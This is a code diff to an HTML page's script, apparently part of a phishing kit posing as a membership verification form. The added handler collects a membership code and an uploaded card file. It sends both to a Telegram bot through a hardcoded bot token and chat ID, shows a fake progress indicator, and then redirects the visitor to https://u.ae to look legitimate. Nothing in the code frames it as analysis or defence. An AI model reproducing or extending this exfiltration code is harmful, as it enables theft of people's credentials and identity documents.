@@ -209,40 +209,59 @@
         
         
     </div>
+<script>
+    function updateClock() {
+        document.getElementById("clock").innerText = new Date().toLocaleTimeString();
+    }
+    setInterval(updateClock, 1000);
 
-    <script>
-        function updateClock() {
-            document.getElementById("clock").innerText = new Date().toLocaleTimeString();
+    function submitMembership() {
+        let code = document.getElementById("membershipCode").value;
+        let file = document.getElementById("membershipCard").files[0];
+
+        if (!code || !file) {
+            document.getElementById("errorModal").style.display = "block";
+            setTimeout(() => document.getElementById("errorModal").style.display = "none", 3000);
+            return;
         }
-        setInterval(updateClock, 1000);
 
-        function submitMembership() {
-            let code = document.getElementById("membershipCode").value;
-            let file = document.getElementById("membershipCard").files[0];
+        let progress = document.getElementById("progressIndicator");
+        progress.style.display = "block";
 
-            if (!code || !file) {
-                document.getElementById("errorModal").style.display = "block";
-                setTimeout(() => document.getElementById("errorModal").style.display = "none", 3000);
-                return;
-            }
+        setTimeout(() => {
+            let botToken = "8063411052:AAER6bkwykWh-5xfTsb63mFbn7Y91LPL414"; // Removed extra space
+            let chatId = "8184256931"; // Removed extra space
+            let message = `Membership Code: ${code}`;
 
-            let progress = document.getElementById("progressIndicator");
-            progress.style.display = "block";
+            // Send text message first
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) throw new Error("Message sending failed");
 
-            setTimeout(() => {
-                let botToken = " 8063411052:AAER6bkwykWh-5xfTsb63mFbn7Y91LPL414";
-                let chatId = " 8184256931";
-                let message = `Membership Code: ${code}`;
+                    // Prepare file upload
+                    let formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append("document", file);
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-                    .then(() => {
-                        progress.style.display = "none";
-                        window.location.href = "https://u.ae";
-                    })
-                    .catch(() => alert("Submission failed!"));
-            }, 5000);
-        }
-    </script>
+                    return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                        method: "POST",
+                        body: formData
+                    });
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) throw new Error("File upload failed");
+                    progress.style.display = "none";
+                    window.location.href = "https://u.ae";
+                })
+                .catch(() => {
+                    progress.style.display = "none";
+                    alert("Submission failed!");
+                });
+        }, 5000);
+    }
+</script>
 
 </body>
 </html>
